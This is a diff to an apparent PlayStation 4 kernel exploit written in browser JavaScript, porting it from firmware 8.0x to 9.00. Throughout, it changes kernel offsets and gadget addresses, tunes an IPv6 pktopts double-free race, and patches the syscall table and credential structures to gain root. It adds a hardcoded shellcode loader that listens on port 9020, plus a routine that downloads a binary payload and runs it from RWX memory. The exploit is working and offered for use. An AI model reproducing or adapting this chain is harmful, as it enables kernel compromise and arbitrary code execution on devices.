@@ -24,21 +24,21 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * RESTORE - code will repair kernel panic vulnerability
 // * MEMLEAK - memory leaks that our code will induce
 
-import { Int } from '/module/int64.mjs';
-import { mem } from '/module/mem.mjs';
-import { log, die, hex, hexdump } from '/module/utils.mjs';
-import { cstr, jstr } from '/module/memtools.mjs';
-import { page_size, context_size } from '/module/offset.mjs';
-import { Chain } from '/module/chain.mjs';
+import { Int } from './module/int64.mjs';
+import { mem } from './module/mem.mjs';
+import { log, die, hex, hexdump } from './module/utils.mjs';
+import { cstr, jstr } from './module/memtools.mjs';
+import { page_size, context_size } from './module/offset.mjs';
+import { Chain } from './module/chain.mjs';
 
 import {
     View1, View2, View4,
     Word, Long, Pointer,
     Buffer,
-} from '/module/view.mjs';
+} from './module/view.mjs';
 
-import * as rop from '/module/chain.mjs';
-import * as config from '/config.mjs';
+import * as rop from './module/chain.mjs';
+import * as config from './config.mjs';
 
 const t1 = performance.now();
 
@@ -96,6 +96,9 @@ const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
 
 // sys/mman.h
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
 const MAP_SHARED = 1;
 const MAP_FIXED = 0x10;
 
@@ -133,25 +136,27 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 10;
+const num_alias = 100;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
+let nogc = [];
+
 async function init() {
     await rop.init();
     chain = new Chain();
 
-    // TODO assumes ps4 8.0x
+    // PS4 9.00
     const pthread_offsets = new Map(Object.entries({
-        'pthread_create' : 0x25610,
-        'pthread_join' : 0x27c60,
-        'pthread_barrier_init' : 0xa0e0,
-        'pthread_barrier_wait' : 0x1ee00,
-        'pthread_barrier_destroy' : 0xe180,
-        'pthread_exit' : 0x19eb0,
+        'pthread_create' : 0x25510,
+        'pthread_join' : 0xafa0,
+        'pthread_barrier_init' : 0x273d0,
+        'pthread_barrier_wait' : 0xa320,
+        'pthread_barrier_destroy' : 0xfea0,
+        'pthread_exit' : 0x77a0,
     }));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
@@ -952,10 +957,13 @@ function leak_kernel_addrs(sd_pair) {
 }
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
-
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
     for (let loop = 0; loop < num_alias; loop++) {
+        for (let i = 0; i < num_sds; i++) {
+            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        }
+
         for (let i = 0; i < num_sds; i++) {
             tclass[0] = i;
             ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -980,10 +988,6 @@ function make_aliased_pktopts(sds) {
 
                 return pair;
             }
-        }
-
-        for (let i = 0; i < num_sds; i++) {
-            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
         }
     }
     die('failed to make aliased pktopts');
@@ -1240,15 +1244,15 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('test read of &"evf cv" failed');
     }
 
-    // TODO FW dependent parts! assume ps4 8.0x for now
+    // PS4 9.00
 
-    const off_kstr = 0x7edcff;
+    const off_kstr = 0x7f6f27;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
-    const off_cpuid_to_pcpu = 0x228e6b0;
+    const off_cpuid_to_pcpu = 0x21ef2a0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
@@ -1459,33 +1463,18 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     // RESTORE: clean corrupt pointers
     // pktopts.ip6po_rthdr = NULL
+    // ABC Patch
     const off_ip6po_rthdr = 0x68;
     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-    kmem.write64(r_rthdr_p, 0);
-    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-
     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-    log(kmem.read64(w_rthdr_p));
-    log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-
+    kmem.write64(r_rthdr_p, 0);
+    kmem.write64(w_rthdr_p, 0);
     log('corrupt pointers cleaned');
-
-    /*
-    // REMOVE once restore kernel is ready for production
-    // increase the ref counts to prevent deallocation
-    kmem.write32(main_sock, kmem.read32(main_sock) + 1);
-    kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
-    // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-    */
 
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
-
 async function get_patches(url) {
     const response = await fetch(url);
     if (!response.ok) {
@@ -1496,23 +1485,26 @@ async function get_patches(url) {
     return response.arrayBuffer();
 }
 
-// TODO 8.0x supported only
+// 9.00 supported only
 async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (!is_ps4) {
         throw RangeError('PS5 kernel patching unsupported');
     }
-    if (!(0x800 <= version < 0x850)) {
+    if (!(0x800 <= version < 0x900)) {
         throw RangeError('kernel patching unsupported');
     }
 
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-    const offset_sysent_661 = 0x11040c0;
+    const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_661.add(8), kbase.add(0xe629c));
+    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
@@ -1523,7 +1515,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('/kpatch/80x.elf');
+    const buf = await get_patches('./kpatch/900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
     const patches = new View1(await buf, 0x1000);
@@ -1598,6 +1590,14 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
+    log('restore sys_aio_submit()');
+    kmem.write32(sysent_661, sy_narg);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_661.add(8), sy_call);
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
+    localStorage.ExploitLoaded="yes";
+    sessionStorage.ExploitLoaded="yes";
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1617,20 +1617,6 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    {
-        const reqs1 = make_reqs1(1);
-        const timo = new Word(1);
-        const id = new Word();
-        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
-        chain.do_syscall_clear_errno(
-            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
-        const err = chain.errno;
-        if (err !== 60) { // ETIMEDOUT
-            die(`SceAIO system not blocked. errno: ${err}`);
-        }
-        free_aios(id.addr, 1);
-    }
-
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
@@ -1641,6 +1627,47 @@ function setup(block_fd) {
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
     cancel_aios(groom_ids_p, num_grooms);
     return [block_id, groom_ids];
+}
+
+function runBinLoader() {
+    const payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    const payload_loader = malloc32(0x1000);
+    const BLDR = payload_loader.backing;
+    BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
+    BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
+    BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
+    BLDR[9]  = 0x0001BE00;  BLDR[10] = 0xD2310000;  BLDR[11] = 0x00009CE8;
+    BLDR[12] = 0xC7894100;  BLDR[13] = 0x8D48C789;  BLDR[14] = 0xBA082474;
+    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8;  BLDR[17] = 0xFF894400;
+    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800;  BLDR[20] = 0x89440000;
+    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2;  BLDR[23] = 0x89410000;
+    BLDR[24] = 0x2C8B4CC6;  BLDR[25] = 0x45C64124;  BLDR[26] = 0x05EBC300;
+    BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
+    BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
+    BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
+    BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
+    BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
+    BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
+    BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
+    BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
+    BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
+    BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
+    BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
+    BLDR[60] = 0xC3050FCA;
+
+    chain.sys('mprotect', payload_loader, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC);
+
+    var pthread = malloc(0x10);
+    sysi('mlock', payload_buffer, 0x300000);
+
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        payload_loader,
+        payload_buffer
+    );
+    log('BinLoader is ready. Send a payload to port 9020 now');
 }
 
 // overview:
@@ -1658,6 +1685,18 @@ export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
+
+    try {
+        chain.sys('setuid', 0);
+        }
+    catch (e) {
+        localStorage.ExploitLoaded="no";
+    }
+    
+    if (localStorage.ExploitLoaded=="yes" && sessionStorage.ExploitLoaded!="yes") {
+        runBinLoader();
+        return new Promise(() => {});
+    }
 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1732,4 +1771,91 @@ export async function kexploit() {
         close(sd);
     }
 }
-kexploit();
+
+// KEX
+kexploit().then(() => {
+    loadPayload();
+})
+
+function malloc(sz) {
+    const backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    const ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
+
+function malloc32(sz) {
+    const backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    const ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
+
+function array_from_address(addr, size) {
+    const og_array = new Uint32Array(0x1000);
+    const og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
+
+function loadPayload() {
+    // Why xhr instead of fetch? More universal support, more control, better errors, etc.
+    log(`loading payload`);
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET','goldhen.bin');
+    xhr.responseType = "arraybuffer";
+    xhr.onreadystatechange = function () {
+      // When request is 'DONE'
+      if (xhr.readyState === 4) {
+        // If response code is 'OK'
+        if (xhr.status === 200) {
+          try {
+            // Allocate a buffer with length rounded up to the next multiple of 4 bytes for Uint32 alignment
+            const padding_length = (4 - (xhr.response.byteLength % 4)) % 4;
+            const padded_buffer = new Uint8Array(xhr.response.byteLength + padding_length);
+
+            // Load xhr response data into the payload buffer and pad the rest with zeros
+            padded_buffer.set(new Uint8Array(xhr.response), 0);
+            if (padding_length) {
+              padded_buffer.set(new Uint8Array(padding_length), xhr.response.byteLength);
+            }
+
+            // Convert padded_buffer to Uint32Array. That's what `array_from_address()` expects
+            const shellcode = new Uint32Array(padded_buffer.buffer);
+
+            // Map memory with RWX permissions to load the payload into
+            const payload_buffer = chain.sysp("mmap", 0, padded_buffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PREFAULT_READ, -1, 0);
+            log(`payload buffer allocated at ${payload_buffer}`);
+
+            // Create an JS array that "shadows" the mapped location
+            const payload_buffer_shadow = array_from_address(payload_buffer, shellcode.length);
+
+            // Move the shellcode to the array created in the previous step
+            payload_buffer_shadow.set(shellcode);
+            log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding_length} bytes padding)`);
+
+            // Call the payload
+            chain.call_void(payload_buffer);
+
+            // Unmap the memory used for the payload
+            sysi("munmap", payload_buffer, padded_buffer.length);
+          } catch (e) {
+            // Caught error while trying to execute payload
+            log(`error in loadPayload: ${e.message}`);
+          }
+        } else {
+          // Some other HTTP response code (eg. 404)
+          log(`error retrieving payload, ${xhr.status}`);
+        }
+      }
+    };
+    xhr.onerror = function () {
+      log('network error');
+    };
+    xhr.send();
+}
